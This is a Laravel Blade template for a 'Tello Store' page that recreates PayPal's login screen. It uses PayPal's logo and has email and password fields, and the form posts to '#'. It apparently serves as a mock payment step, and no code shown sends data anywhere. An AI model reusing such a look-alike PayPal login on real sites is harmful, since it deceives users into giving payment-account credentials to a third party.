<!DOCTYPE html>

<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Tello Store | PayPal</title>
    <!-- Favicon-->
    <link rel="shortcut icon" href="{{URL::asset('img/logos/logoTello.png')}}">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="{{URL::asset('/css/paypal.css')}}">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>

<body>
    <div id="main" class="main " role="main">
        <section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
            <div class="corral">
                  <div id="content" class="contentContainer">
                    <header>
                        <p class="paypal-logo paypal-logo-long"><center><img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png"></center></p>
                      </header>
                    <form action="#" method="post" class="proceed maskable" name="login" autocomplete="off" novalidate="">
                        <div id="passwordSection" class="clearfix">
                            <div class="textInput" id="login_emaildiv">
                                <div class="fieldWrapper">
                                    <label for="email" class="fieldLabel">Email</label>
                                    <input id="email" name="login_email" type="email" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" autocomplete="off" placeholder="Email" required>
                               </div>
                            </div>
                            
                         <div class="textInput lastInputField" id="login_passworddiv">
                             <div class="fieldWrapper"><label for="password" class="fieldLabel">Password</label>
                                <input id="password" name="login_password" type="password" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" placeholder="Password" required>
                           </div>
                         </div>
                       </div>
                   <div class="actions actionsSpaced"><button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login">Log In</button></div><div class="forgotLink"><a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Having trouble logging in?</a></div><input type="hidden" id="bp_mid" name="bp_mid" value="">
                   </form>
                   
                   <a href="#" class="button secondary" id="createAccount">Sign Up</a></div></div></section></div>
<script src="{{URL::asset('/js/payment.js')}}"></script>
</body>

</html>
